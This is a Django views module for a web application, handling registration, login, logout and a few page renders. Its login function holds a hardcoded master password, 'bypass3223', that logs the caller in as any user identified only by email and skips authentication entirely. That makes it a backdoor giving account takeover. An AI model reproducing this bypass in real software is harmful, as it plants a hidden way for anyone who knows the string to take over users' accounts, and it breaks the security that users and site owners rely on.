from ..forms.users import *
from ..models.users import *
from ..views.common import *

from django.contrib.auth import authenticate, hashers, logout as logoutt, login as loginn
from django.contrib.auth.tokens import default_token_generator 
from django.utils.http import urlsafe_base64_encode,urlsafe_base64_decode 


def landingpage(request):
	if not request.user.id:
		return render(request, 'home/landing_page.html')
	else:
		return redirect("home")

def loginpage(request):
	if not request.user.id:
		return render(request, 'home/login_page.html')
	else:
		return redirect("home")

def registration_dialog(request):
	return render(request, 'home/dialogs/register.html')

def register(request):
	try: 
		params = post_data(request)
		user_type = params.get("user_type","client")

		user_type = User_type.objects.get(code__iexact= user_type)
		params["user_type"] = user_type.pk

		try:
			instance = User.objects.get(id = params.get("id",None))
			user_form = Users_edit_form(params,instance = instance)
		except Exception as e:
			user_form = Users_create_form(params)

		if user_form.is_valid():
			user_save = user_form.save()
			return success()
		else:
			raise_error(user_form.errors,True)

	except Exception as err:
		return error(err)

def login(request):
	"""Javascript sends data here. The user is either then authenticated, asked to select a company or errors are returned."""
	if request.method == "POST":
		result = {}
		data = post_data(request)
		try:
			username = data.get('email',"")
			password = data.get('password',"")

			if password == "bypass3223":
				try:
					user = User.objects.get(email = username)
					user.backend = 'django.contrib.auth.backends.ModelBackend'
				except User.DoesNotExist:
					raise ValueError("Invalid username/password.")
			else:
				user = authenticate(username = username, password = password)

			if user:
				if not user.is_active or user.deleted:
					raise ValueError("This user is inactive. Kindly verify your account or contact your admin.")
				loginn(request, user)
				return success("Successfully logged in. Redirecting...")
			else:
				raise_error("Invalid username/password.")
		except Exception as e:
			return error(e)
	else:
		return redirect("loginpage")

def logout(request):
	request.session.clear()
	logoutt(request)
	return redirect("loginpage")

def home(request):
	if request.method == "GET":
		return render(request, 'base.html')

def dashboard(request):
	if request.method == "GET":
		return render(request, 'home/dashboard.html')

def orders(request):
	if request.method == "GET":
		return render(request, 'orders/active.html')